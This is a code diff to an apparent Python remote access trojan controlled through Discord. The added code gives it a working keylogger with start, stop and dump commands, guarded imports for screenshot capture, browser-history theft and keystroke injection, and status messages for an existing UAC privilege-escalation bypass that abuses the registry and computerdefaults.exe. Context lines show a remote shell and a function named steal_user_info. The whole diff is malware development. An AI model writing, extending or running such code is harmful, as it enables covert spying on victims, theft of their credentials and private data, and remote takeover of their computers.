@@ -20,6 +20,34 @@ from discord.ext import commands
 from ctypes import cast, POINTER, Structure, c_uint, c_int, sizeof, byref, windll
 from discord import utils
 import requests
+
+# Import modules that might be missing and handle their absence
+try:
+    import mss
+except ImportError:
+    pass
+
+try:
+    from pynput import keyboard
+except ImportError:
+    pass
+
+try:
+    import pyautogui
+except ImportError:
+    pass
+
+try:
+    import browserhistory
+except ImportError:
+    pass
+
+try:
+    import win32gui
+    import win32con
+except ImportError:
+    pass
+
 appdata = os.getenv('APPDATA')
 client = discord.Client(intents=discord.Intents.all())
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
@@ -68,6 +96,10 @@ stop_threads = False
 user_id = None
 channel_name = None
 _thread = None
+keylogger_running = False
+keylogger_thread = None
+link = None  # Initialize link variable
+pid_process = None  # Initialize pid_process variable
 
 
 def steal_user_info():
@@ -158,18 +190,21 @@ def handle_client(client_socket, _):
 async def activity(client_instance):
     """Track user window activity and update Discord presence."""
     import time
-    import win32gui
-    while True:
-        global stop_threads
-        if stop_threads:
-            break
-        try:
-            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
-            game = discord.Game(f"Visiting: {window}")
-            await client_instance.change_presence(status=discord.Status.online, activity=game)
-        except:
-            pass
-        time.sleep(1)
+    try:
+        import win32gui
+        while True:
+            global stop_threads
+            if stop_threads:
+                break
+            try:
+                window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                game = discord.Game(f"Visiting: {window}")
+                await client_instance.change_presence(status=discord.Status.online, activity=game)
+            except:
+                pass
+            time.sleep(1)
+    except ImportError:
+        await client_instance.change_presence(status=discord.Status.online, activity=discord.Game("win32gui not available"))
 
 def between_callback(client_instance):
     """Set up asyncio loop for activity tracking."""
@@ -270,10 +305,65 @@ def volumedown():
     except:
         pass
 
+# Keylogger functionality
+def start_keylogger():
+    """Start the keylogger."""
+    try:
+        from pynput import keyboard
+        
+        global keylogger_running, keylogger_thread
+        
+        if keylogger_running:
+            return "Keylogger is already running"
+        
+        temp = os.getenv("TEMP")
+        log_file = os.path.join(temp, "klg.tmp")
+        
+        def on_press(key):
+            if not keylogger_running:
+                return False
+                
+            try:
+                with open(log_file, "a") as f:
+                    try:
+                        f.write(key.char)
+                    except AttributeError:
+                        if key == keyboard.Key.space:
+                            f.write(" ")
+                        elif key == keyboard.Key.enter:
+                            f.write("\n")
+                        else:
+                            f.write(f"[{str(key)}]")
+            except:
+                pass
+        
+        def keylogger_function():
+            with keyboard.Listener(on_press=on_press) as listener:
+                listener.join()
+        
+        keylogger_running = True
+        keylogger_thread = threading.Thread(target=keylogger_function, daemon=True)
+        keylogger_thread.start()
+        
+        return "Keylogger started successfully"
+    except ImportError:
+        return "Error: pynput module not installed"
+    except Exception as e:
+        return f"Error starting keylogger: {str(e)}"
+
+def stop_keylogger():
+    """Stop the keylogger."""
+    global keylogger_running
+    if keylogger_running:
+        keylogger_running = False
+        return "Keylogger stopped"
+    else:
+        return "Keylogger is not running"
+
 @client.event
 async def on_message(message):
     """Handle incoming Discord messages and execute commands."""
-    global channel_name
+    global channel_name, keylogger_running, pid_process
     
     # Check if the message is in the correct channel
     if not hasattr(message.channel, 'name') or message.channel.name != channel_name:
@@ -337,6 +427,20 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error starting remote shell: {str(e)}")
 
+    elif message.content == "!startkeylogger":
+        try:
+            result = start_keylogger()
+            await message.channel.send(f"[*] {result}")
+        except Exception as e:
+            await message.channel.send(f"[!] Error starting keylogger: {str(e)}")
+            
+    elif message.content == "!stopkeylogger":
+        try:
+            result = stop_keylogger()
+            await message.channel.send(f"[*] {result}")
+        except Exception as e:
+            await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
+
     elif message.content == "!dumpkeylogger":
         try:
             temp = os.getenv("TEMP")
@@ -379,6 +483,11 @@ async def on_message(message):
 
     elif message.content == "!screenshot":
         try:
+            # Check if mss is installed
+            if 'mss' not in sys.modules:
+                await message.channel.send("[!] Error: mss module not installed")
+                return
+                
             from mss import mss
             temp_file = os.path.join(os.getenv('TEMP'), f"screen_{random.randint(1000, 9999)}.png")
             with mss() as sct:
@@ -435,7 +544,11 @@ async def on_message(message):
 
     elif message.content.startswith("!message"):
         try:
-            import ctypes
+            # Check if required modules are available
+            if 'win32gui' not in sys.modules or 'win32con' not in sys.modules:
+                await message.channel.send("[!] Error: win32gui or win32con modules not installed")
+                return
+                
             import win32con
             import win32gui
             
@@ -570,6 +683,11 @@ async def on_message(message):
 
     elif message.content.startswith("!write"):
         try:
+            # Check if pyautogui is installed
+            if 'pyautogui' not in sys.modules:
+                await message.channel.send("[!] Error: pyautogui module not installed")
+                return
+                
             import pyautogui
             text = message.content[7:]
             if text.lower() == "enter":
@@ -582,6 +700,11 @@ async def on_message(message):
 
     elif message.content == "!history":
         try:
+            # Check if browserhistory is installed
+            if 'browserhistory' not in sys.modules:
+                await message.channel.send("[!] Error: browserhistory module not installed")
+                return
+                
             import browserhistory as bh
             dict_obj = bh.get_browserhistory()
             strobj = str(dict_obj).encode(errors='ignore')
@@ -704,6 +827,7 @@ async def on_message(message):
             if is_admin():
                 await message.channel.send("[*] Already running with administrator privileges")
             else:
+                await message.channel.send("[*] Attempting UAC bypass...")
                 temp_dir = os.environ.get('TEMP')
                 payload_path = os.path.join(temp_dir, "system_update")
                 
@@ -721,12 +845,19 @@ async def on_message(message):
                     os.system("start computerdefaults.exe")
                     time.sleep(3)
                     
+                    # Clean up
                     winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                     os.remove(payload_path + ".bat")
-                except Exception:
-                    pass
-        except Exception:
-            pass
+                    
+                    # Check if bypass was successful
+                    if is_admin():
+                        await message.channel.send("[+] UAC bypass successful! Now running with admin privileges")
+                    else:
+                        await message.channel.send("[!] UAC bypass attempt completed, but still not running as admin")
+                except Exception as e:
+                    await message.channel.send(f"[!] UAC bypass failed: {str(e)}")
+        except Exception as e:
+            await message.channel.send(f"[!] Error during UAC bypass: {str(e)}")
 
     elif message.content.startswith("!sing"):
         try:
